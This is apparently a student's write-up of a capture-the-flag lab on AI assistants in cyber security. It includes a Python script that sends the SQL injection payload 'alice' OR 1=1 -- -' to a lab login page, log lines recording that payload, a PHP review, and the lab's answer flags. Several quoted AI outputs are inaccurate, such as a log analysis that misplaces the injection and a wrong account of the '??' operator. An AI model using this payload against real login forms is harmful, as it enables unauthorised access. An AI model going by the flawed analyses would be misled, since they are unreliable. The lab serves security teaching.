## Introduction

---
#### The Story

The lights glimmer and servers hum blissfully at The Best Festival Company (TBFC), melting the snow surrounding the data centre. TBFC has continued its pursuit of AI excellence. After the past two years, they realise that Van Chatty, their in-house chatbot, wasn’t quite meeting their standards. 

Unfortunately for the elves at TBFC, they are also not immune to performance metrics. The elves aim to find ways of increasing their velocity; something to manage the tedious, distracting tasks, which allows the elves to do the real magic. 

TBFC, adventurous as ever, is trialling their brand new cyber security AI assistant, Van SolveIT, which is capable of helping the elves with all their defensive, offensive, and software needs. They decide to put this flashy technology to use as Christmas approaches, to identify, confirm, and resolve any potential vulnerabilities, before any nay-sayers can.

#### Learning Objectives

- How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
- Using an AI assistant to solve various tasks within cyber security
- Some of the considerations, particularly in cyber security, surrounding the use of AI

---

## Walkthrough

**01 Introduction: The Boom of AI Assistants**

Artificial Intelligence has evolved from a simple convenience tool into a core component of modern workflows. In cybersecurity, its impact is undeniable. AI now automates repetitive tasks, processes large datasets, highlights suspicious activity, and supports decision-making faster than humans alone.

This room introduces how AI is being applied across cybersecurity fields and what important considerations to keep in mind when deploying AI systems.

**02 AI in Cyber Security**

AI provides several advantages that map directly to cybersecurity needs. It can rapidly analyse vast log datasets, detect anomalies in behaviour, and offer context through generative summaries. These strengths are being integrated across three major areas:

**Defensive Security**
AI agents assist blue teams by continuously processing telemetry, adding context to alerts, and accelerating detection and response. Modern security tools now embed AI for real-time alerting, automated device isolation, email blocking, and monitoring unusual login behaviour.

**Offensive Security**
AI helps pentesters by automating repetitive stages of reconnaissance and data processing. It can handle OSINT collection, parse noisy scan results, and map attack surfaces, allowing the tester to focus more on high-impact manual exploitation.

**Software Security**
AI is used as a development assistant and as a SAST/DAST scanner to identify vulnerabilities in codebases. While AI is promising for detecting issues, it is far less reliable at writing secure code, making human review essential.

**03 Considerations and Practical Exercise**

Although AI offers significant benefits, it comes with risks. Outputs are not always accurate, and relying blindly on AI can lead to misinterpretation, system errors, or even operational damage. Offensive testing poses particular risks, like overloading client systems or triggering race conditions. Additional considerations include data privacy, fairness, transparency, and the security of AI models themselves.

To demonstrate these concepts, the room provides a hands-on activity where you interact with Van SolveIT, an AI assistant showcasing three scenarios:

Red: Generate and use an exploit script.

Blue: Analyse web logs from an attack.

Software: Review and identify vulnerabilities in source code.

Access Van SolveIT at:
http://MACHINE_IP
(using the AttackBox or your VPN-connected device).

Tips:

Responses may appear blank for a moment while generating.

Use “Restart Chat” if the AI becomes confused.

Unlocked stages can be revisited using the navigation menu.


---

## Objectives 

Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?

Access Van SolveIT at http://10.49.142.222

Stage 1: Introduction

<img width="1061" height="829" alt="image" src="https://github.com/user-attachments/assets/2debdc01-d23d-4443-96f0-5defcfc1fa64" />

press the blue 'Complete Stage to Continue' button

Stage 2: Read Team

<img width="1352" height="857" alt="image" src="https://github.com/user-attachments/assets/ede23b60-9aaa-4b6a-8f76-f1cdfd4a452e" />

Prompt: Create python script exploit for a vulnerable website hosted at 10.49.142.222.5000

<img width="1356" height="805" alt="image" src="https://github.com/user-attachments/assets/510ed8b0-73a7-453a-971e-0f0d74ff4b71" />

Response:

```
AI Assistant

HOW TO SAVE THE FILE
1) Open your terminal or visual editor (e.g., Sublime Text).
2) Use the command nano script.py to create the file.
3) Paste the following code into the file:

import sys

def main():
    # This script exploits the SQL injection vulnerability by injecting "alice' OR 1=1 -- -"
    # Replace "alice' OR 1=1 -- -" with your actual SQL query
    username = input("Enter your username: ")
    print(f"Username: {username}")
    sys.exit()

if __name__ == "__main__":
    main()


4) Save the file with Ctrl + O and exit using Ctrl + X.
5) Run the script using python3 script.py to execute the exploit.

The script will prompt the user for their username and display it. This demonstrates how to exploit the vulnerability using Python.
```

```
AI Assistant

import requests

# Set up the login credentials
**username = "alice' OR 1=1 -- -"**
**password = "test"**

# URL to the vulnerable login page
**url = "http://10.49.142.222.5000/login.php"**

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

Stage 3: Blue Team

<img width="1355" height="851" alt="image" src="https://github.com/user-attachments/assets/72b49748-5c74-4967-bc13-e7b8403cc2ed" />


Prompt: Analyze the logs of a vulnerable website hosted at 10.49.142.222.5000 give the passwords and the usernames


```
AI Assistant

Log Entry:
10.49.142.222 5000 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

### Analysis of the Logs
1. IP Address: The user\u2019s IP is 10.49.142.222, indicating they are a potential attacker.
2. Time and Date: The attack occurred at 09:03 on October 3, 2025, around 10:00 AM.
3. URL: The URL accessed was /login.php, a common endpoint for user authentication.
4. Username Attempted: The username was "alice", and an SQL injection attempt was detected in the password parameter.
5. SQL Injection: The log shows the username being hashed with the malicious string alice%27+OR+1%3D1+--+-&password=test, which is a classic SQL injection attack.

---
AI Assistant

### Useful for a Blue Team Perspective
- Detecting Vulnerabilities: This log entry highlights a potential weakness in the application, indicating that the system could be vulnerable to SQL injection attacks.
- Early Detection: Identifying such vulnerabilities allows the team to prioritize security measures, such as implementing input validation, using SQL parsers, or updating the application.

---

Next Steps:
If you have any questions or need further assistance, feel free to ask! \U0001f4dd
Stage to Continue: Complete Stage to Continue.
```

```
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

```

Stage 4: Software

<img width="1346" height="852" alt="image" src="https://github.com/user-attachments/assets/bc0c0042-7452-4751-a3f6-f3ebeb078a4c" />

Prompt: 

Help me review the source code of a vulnerable website hosted at 10.49.142.222.5000. Identify the vulnerabilities in the source code

```

AI Assistant

php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

FORMATTING GUIDELINES:
- When reviewing the PHP code snippet, in your response, show the whole snippet of the code, not just explain the vulnerability.
- Please format your answer when providing the PHP code snippet to use triple backticks (not single backticks)



1. Identification of the specific vulnerability
The code initializes two variables with ??, which sets them to empty strings. This means that if the POST data contains malicious input (like SQL injection), the variables are not sanitized, allowing an attacker to inject malicious SQL code.

2. Explanation of why the code is vulnerable
This code is vulnerable to SQL injection because the input variables are not sanitized. If an attacker inputs a username or password, the ?? operator sets them to empty, which could be used to construct a query. For example, an attacker could input a query like SELECT * FROM users WHERE username = 'admin' to steal user data.

3. Best practices for preventing similar issues
- Use prepared statements or parameterized queries to prevent SQL injection.
- Sanitize all user inputs (e.g., using htmlspecialchars or similar functions).
- Avoid using ?? in place of proper sanitization.
- Use secure database connections (e.g., mysqli or PDO) to prevent SQL injection attacks.

4. Tools and techniques for code security testing
- Use tools like OWASP ZAP or Burp Suite for SQL injection testing.
- Implement input validation and sanitization.
- Regularly update code to patch vulnerabilities.

5. Complete Showcase!
If you're ready to move on, please click "Complete Showcase!"!

```

<img width="1355" height="852" alt="image" src="https://github.com/user-attachments/assets/b0ffc507-7c3a-4f79-ad61-9377d73ad195" />

THM{AI_MANIA}



---

Execute the exploit provided by the red team agent against the vulnerable web application hosted at MACHINE_IP:5000. What flag is provided in the script's output after it?
Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (MACHINE_IP:5000)


<img width="1356" height="850" alt="image" src="https://github.com/user-attachments/assets/b876ab63-d771-4bf7-abcf-a780f378ef8d" />

```
alice' OR 1=1 -- -

test
```

<img width="1348" height="855" alt="image" src="https://github.com/user-attachments/assets/20f86b30-7df1-4b15-8895-21a7a14184a5" />


<img width="1348" height="850" alt="image" src="https://github.com/user-attachments/assets/9ddea3f1-6f58-4f6a-9e80-5277ca6b7f6b" />

THM{SQLI_EXPLOIT}


---

## Key Takeaways

- AI can significantly enhance defensive, offensive, and software security workflows, but it should be treated as an assistant, not a replacement for human judgment.

- AI excels at automating repetitive, high-volume tasks such as log analysis, scanning large datasets, summarizing findings, and generating test scripts.

- In red teaming, AI can speed up processes like payload generation, exploit template creation, OSINT parsing, and basic script automation.

- In blue teaming, AI helps identify suspicious traffic, anomalies, and malformed input quickly.

- In software security, AI is helpful for explaining vulnerabilities or reviewing snippets, but it still struggles with generating secure code.

- Blind reliance on AI output is dangerous — especially in cybersecurity — because models can hallucinate, misinterpret logs, or suggest harmful/damaging actions if not validated.

- The Van SolveIT showcase demonstrates how AI can guide you across multiple domains, but also why verification, testing, and manual oversight are essential.

- The flag outcomes (THM{AI_MANIA}, THM{SQLI_EXPLOIT}) reinforce how AI can assist in both exploitation and defensive analysis when guided properly.

---

## Reflection

Day 4 was a strong reminder that AI is becoming a core tool in cybersecurity, but not a shortcut. Each stage highlighted both the strengths and limitations of relying on generative models. The red team section showed how AI can rapidly produce usable exploit templates, while the blue team stage emphasized the importance of interpreting logs correctly rather than copying outputs blindly. The software analysis portion reinforced that AI may explain insecure code correctly but still struggles to produce secure implementations on its own.

What stood out the most is the need for human validation at every step. AI can accelerate your workflow, but it shouldn’t be trusted without verification — especially in tasks involving live systems, exploit scripts, or production logs. This challenge demonstrated how AI should be used: as a partner that boosts productivity, not as an autopilot. Overall, Day 4 was a valuable exploration into leveraging AI effectively and safely across different cybersecurity roles.

